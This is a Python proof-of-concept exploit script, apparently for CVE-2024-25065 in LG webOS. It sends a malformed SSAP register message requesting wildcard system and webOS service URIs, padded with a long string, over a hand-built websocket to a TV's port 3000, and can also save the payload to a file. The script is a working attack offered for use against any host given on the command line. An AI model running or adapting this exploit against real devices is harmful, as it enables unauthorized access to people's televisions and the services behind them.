#!/usr/bin/env python3
"""CVE-2024-25065 — LG webOS Luna Bus. Crafted SSAP call that reaches a
privileged service over the ws://<tv>:3000 socket. Pure-stdlib websocket."""
import base64, json, os, socket, struct, sys

def _ws_connect(host, port=3000, path="/"):
    s = socket.create_connection((host, port), timeout=6)
    key = base64.b64encode(os.urandom(16)).decode()
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               "Upgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
    resp = s.recv(4096)
    assert b"101" in resp, resp
    return s

def _ws_send(s, payload: bytes):
    mask = os.urandom(4)
    n = len(payload)
    hdr = bytearray([0x81])
    if n < 126: hdr.append(0x80 | n)
    elif n < 65536: hdr.append(0x80 | 126); hdr += struct.pack(">H", n)
    else: hdr.append(0x80 | 127); hdr += struct.pack(">Q", n)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    s.sendall(bytes(hdr) + mask + masked)

def build() -> bytes:
    # malformed SSAP register with an unbounded URI list
    return json.dumps({
        "id": "poc", "type": "register",
        "payload": {"clientName": "poc",
                    "uri": ["ssap://system/*", "ssap://com.webos.service.*"],
                    "extra": "A" * 2048}}).encode()

def exploit(host, port=3000):
    s = _ws_connect(host, port)
    _ws_send(s, build())
    reply = s.recv(4096)
    s.close()
    print(f"[+] CVE-2024-25065 sent to {host}:{port}, {len(reply)}B reply")
    return {"host": host, "reply": reply[:128]}

def main():
    if len(sys.argv) > 1:
        exploit(sys.argv[1])
    else:
        Path = __import__("pathlib").Path
        Path("cve-2024-25065.json").write_bytes(build())
        print("[+] CVE-2024-25065 SSAP payload written")

if __name__ == "__main__":
    main()
